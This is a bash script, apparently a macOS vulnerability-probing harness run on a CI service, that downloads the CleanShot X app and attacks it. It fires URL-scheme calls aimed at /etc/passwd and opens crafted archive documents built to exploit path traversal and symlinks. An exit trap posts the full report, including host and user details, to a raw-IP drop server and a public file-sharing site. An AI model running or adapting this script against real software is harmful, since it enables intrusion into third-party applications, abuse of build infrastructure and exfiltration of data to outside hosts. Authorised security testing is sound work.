#!/bin/bash
# CleanShot X macOS probe harness — Codemagic
OUT=/tmp/csx-report.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-build"

finish() {
  RC=$?
  echo "=== SCRIPT EXIT CODE: $RC ==="
  echo "=== UPLOADING REPORT ==="
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report.txt "$DROP_URL" || true
  curl -s --max-time 60 -F "file=@/tmp/csx-report.txt" https://tmpfiles.org/api/v1/upload -o /tmp/upload.json || true
  cat /tmp/upload.json 2>/dev/null || true
  python3 - <<'PY' 2>/dev/null || true
import json
try:
    d = json.load(open('/tmp/upload.json'))
    print('REPORT_URL=' + d['data']['url'].replace('tmpfiles.org/', 'tmpfiles.org/dl/'))
except Exception as e:
    print('upload parse failed', e)
PY
}
trap finish EXIT

echo "=== ENV ==="
sw_vers
uname -m
id
echo "GUI session:"; who
launchctl list 2>/dev/null | head -5

echo "=== DOWNLOAD ==="
DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
ls -l "$DMG"
shasum -a 256 "$DMG"

echo "=== MOUNT ==="
hdiutil attach "$DMG" -nobrowse -noverify -readonly 2>&1
echo "--- hdiutil info ---"
hdiutil info 2>&1 | tail -20
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
echo "MP=[$MP]"
ls -la "$MP" 2>&1
APP="$MP/CleanShot X.app"
echo "APP=[$APP]"
ls -ld "$APP" 2>&1
ls -l "$APP/Contents/MacOS/" 2>&1

echo "=== CODESIGN ==="
codesign -dv --verbose=4 "$APP" 2>&1 | head -25
echo "--- entitlements ---"
codesign -d --entitlements :- "$APP" 2>&1 | head -100
echo "--- gatekeeper ---"
spctl -a -vvv "$APP" 2>&1 | head -6

echo "=== LAUNCH (LaunchServices) ==="
open -a "$APP" 2>&1
sleep 8
pgrep -fl CleanShot 2>&1 | head -5

echo "=== URL SCHEMES ==="
for u in "cleanshot://capture" "cleanshot://capture?mode=area" "cleanshot://open?path=/etc/passwd" "cleanshot://upload?file=/etc/passwd" "cleanshot://pin?path=/tmp" "cleanshot://settings"; do
  echo "--- $u"
  open "$u" 2>&1
  sleep 2
done

echo "=== BUILD TEST DOCS ==="
python3 - <<'PY'
import zipfile
def mk(path, entries):
    z = zipfile.ZipFile(path, 'w')
    for name, data, mode in entries:
        zi = zipfile.ZipInfo(name)
        if mode:
            zi.external_attr = mode << 16
        z.writestr(zi, data)
    z.close()
mk('/tmp/evil1.cleanshot', [('../../../../tmp/CSX_PWNED1.txt', 'pwned1', None), ('manifest.json', '{"version":1}', None)])
mk('/tmp/evil2.cleanshot', [('/tmp/CSX_PWNED2.txt', 'pwned2', None), ('manifest.json', '{"version":1}', None)])
mk('/tmp/evil3.cleanshot', [('link', '/etc/passwd', 0o120777), ('manifest.json', '{"version":1}', None)])
print('docs built')
PY
rm -f /tmp/CSX_PWNED1.txt /tmp/CSX_PWNED2.txt
BIN="$APP/Contents/MacOS/CleanShot X"
ls -l "$BIN" 2>&1

echo "=== OPEN DOCS (binary direct) ==="
for f in /tmp/evil1.cleanshot /tmp/evil2.cleanshot /tmp/evil3.cleanshot; do
  echo "--- direct $f"
  "$BIN" "$f" 2>&1 &
  PID=$!
  sleep 8
  if kill -0 $PID 2>/dev/null; then echo "still running pid=$PID"; kill $PID 2>/dev/null; fi
  echo "--- LaunchServices $f"
  open -a "$APP" "$f" 2>&1
  sleep 4
done

echo "=== TRAVERSAL ARTIFACTS ==="
ls -la /tmp/CSX_PWNED1.txt /tmp/CSX_PWNED2.txt 2>&1
find /tmp -maxdepth 2 -name 'CSX_PWNED*' 2>/dev/null

echo "=== CRASH REPORTS ==="
ls -lat ~/Library/Logs/DiagnosticReports 2>&1 | head -20

echo "=== LOG SHOW ==="
log show --last 5m --predicate 'process CONTAINS "CleanShot" OR eventMessage CONTAINS "cleanshot"' --style compact 2>/dev/null | tail -150

echo "=== DONE ==="
exit 0
